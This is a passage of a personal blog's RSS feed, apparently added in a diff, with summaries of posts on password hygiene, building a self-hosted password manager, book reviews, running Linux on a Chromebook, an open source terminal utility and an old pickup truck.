+You&amp;rsquo;re standing next to the ladder, holding it if you are using one of the world&amp;rsquo;s most common passwords like 123456, password, qwerty, 123456789, or letmein. Amazingly, even in 2018, 8-10% of people still use these most basic of passwords. If your username is discovered, your password is immediately compromised by even the simplest of dictionary attacks.</description>
+    </item>
+    
+    <item>
+      <title>Book Review: From the Outside</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/04/06/book-review-from-the-outside/</link>
+      <pubDate>Fri, 06 Apr 2018 00:34:46 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/04/06/book-review-from-the-outside/</guid>
+      <description>From the Outside is a nice memoir from NBA Hall of Famer, Ray Allen. I chose to read this book because of this article that Ray Allen published in the Players Tribune last year. Allen is known for having one of the best work ethics in the NBA - his 18 year career proved that he did a lot of things right. While the memoir details a number of conflicts and drama Allen experienced with teammates and coaches, I was particularly attracted to the book to see if I could learn more about Allen&amp;rsquo;s habits.</description>
+    </item>
+    
+    <item>
+      <title>Rolling My Own Password Manager (Part 2)</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/04/05/rolling-my-own-password-manager-part-2/</link>
+      <pubDate>Thu, 05 Apr 2018 02:25:52 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/04/05/rolling-my-own-password-manager-part-2/</guid>
+      <description>Continuing the review of how I implemented my own password manager, this is part two. If you&amp;rsquo;d like to read part 1, you can do so here. For somewhat obvious reasons I am not going to share the product name or the specific details about my implementation broadly here. I would be glad to provide a bit more information: if you are so interested, leave a comment below and I can reply to your question directly.</description>
+    </item>
+    
+    <item>
+      <title>Rolling My Own Proper Password Manager (Part 1)</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/03/31/rolling-my-own-proper-password-manager/</link>
+      <pubDate>Sat, 31 Mar 2018 14:54:36 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/03/31/rolling-my-own-proper-password-manager/</guid>
+      <description>On previous posts here I shared my poor hygiene when it comes to password management (reusing the same password and not having passwords complex enough). I&amp;rsquo;m really happy to say I&amp;rsquo;ve made some major improvements. I&amp;rsquo;ve been meaning to roll my own password manager and I had a few requirements in mind.
+1.) I wanted to host the web application myself on my own server so I could access it from any device and share access with my spouse.</description>
+    </item>
+    
+    <item>
+      <title>TurboTerm: The (Re-)Birth of My First Open Source Project</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2017/11/28/turboterm-the-re-birth-of-my-first-open-source-project/</link>
+      <pubDate>Tue, 28 Nov 2017 03:34:07 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2017/11/28/turboterm-the-re-birth-of-my-first-open-source-project/</guid>
+      <description>[ ](https://i.imgur.com/46O1Eyk.png) A quick note to mention I authored my first open source project today. Not only was it a great chance to breathe some life into an old project of mine, but a chance to officially get comfortable using Git and GitHub. More work and learning to do, but I am very proud to have a working (on Linux, anyway) terminal configuration utility. I have included a todo file to capture the enhancements I plan to make.</description>
+    </item>
+    
+    <item>
+      <title>Dual Boot GalliumOS on a Chromebook</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2017/11/26/fully-installing-linux-on-a-chromebook/</link>
+      <pubDate>Sun, 26 Nov 2017 14:32:14 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2017/11/26/fully-installing-linux-on-a-chromebook/</guid>
+      <description>[ ](https://i.imgur.com/XP6LFjd.png) I had some success running Ubuntu on my Chromebook through Crouton, but I started running into issues. My hypothesis is that since aspects of the Linux kernel are shared between ChromeOS through chroot with Crouton, I couldn&amp;rsquo;t get a clean installation of Apache to run. I assume this was due to permissions. So I set out on yet another Linux adventure to do a true installation of Linux on the Chromebook.</description>
+    </item>
+    
+    <item>
+      <title>Book Review: Divine Direction</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2017/11/18/book-review-divine-direction/</link>
+      <pubDate>Sat, 18 Nov 2017 12:40:27 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2017/11/18/book-review-divine-direction/</guid>
+      <description>[caption id=&amp;quot;attachment_124&amp;rdquo; align=&amp;quot;alignleft&amp;rdquo; width=&amp;quot;225&amp;rdquo;]A book as big as your head![/caption]Divine Direction: 7 Decisions That Will Change Your Life written by Craig Groeschel broke down seven decisions you need to make: Stop, Start, Go, Stay, Serve, Connect, and Trust. The book interweaves well-known biblical stories to demonstrate aspects of the decision. Overall, this book was topical and a quick read, and a good tool to do some self reflection. The seven decisions, in general, are good things to keep in mind day-to-day.</description>
+    </item>
+    
+    <item>
+      <title>The Open Source Truck</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2017/11/12/the-open-source-truck/</link>
+      <pubDate>Sun, 12 Nov 2017 14:47:25 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2017/11/12/the-open-source-truck/</guid>
+      <description>[caption id=&amp;quot;attachment_103&amp;rdquo; align=&amp;quot;aligncenter&amp;rdquo; width=&amp;quot;660&amp;rdquo;]The open source equivalent in a truck.[/caption]
+I went offline for project number 3. I drive a 1991 GMC C2500 pickup truck. I&amp;rsquo;ve owned this beautiful gold truck for about four years. In it&amp;rsquo;s own, non-Internet-y way, the truck itself follows our ground rules. It was cheap and paid for in cash (Rule #2). You can buy a laptop for more than I spent on this. Whenever possible I try to do the work on it myself (Rule #1).</description>
+    </item>
+    
+    <item>
+      <title>Run Ubuntu Linux on a Chromebook</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2017/11/11/run-ubuntu-linux-on-a-chromebook/</link>
+      <pubDate>Sat, 11 Nov 2017 01:03:05 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2017/11/11/run-ubuntu-linux-on-a-chromebook/</guid>
+      <description>Project number 2 is in the can! I am now running Ubuntu Linux on my Acer Chromebook in a dual boot environment thanks to Crouton. Actually, it would be more accurate to say that I am running Ubuntu Linux concurrently and on top of the Chromium kernel. This 11 inch 64 bit Intel white workhorse met my needs for casual browsing since I first bought it in April of 2015. Great battery life, to boot.</description>
+    </item>
+    
+    <item>
+      <title>We landed here, on the internet, safely in one piece!</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2017/11/07/hello-world/</link>
+      <pubDate>Tue, 07 Nov 2017 01:58:27 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2017/11/07/hello-world/</guid>
+      <description>Our first project is in the can! I call this project &amp;ldquo;Make a Website, Start Following Through on Your Development Plan.&amp;rdquo;
+The first step was to find a domain name using Instant Domain Search. I&amp;rsquo;ve been using this site for at least 5 years and it remains the fastest and simplest way to find a domain.
+I then bought the cheapest hosting plan on Bluehost after hearing an advertisement on The Bill Simmons podcast.</description>
+    </item>
+    
+  </channel>
+</rss>
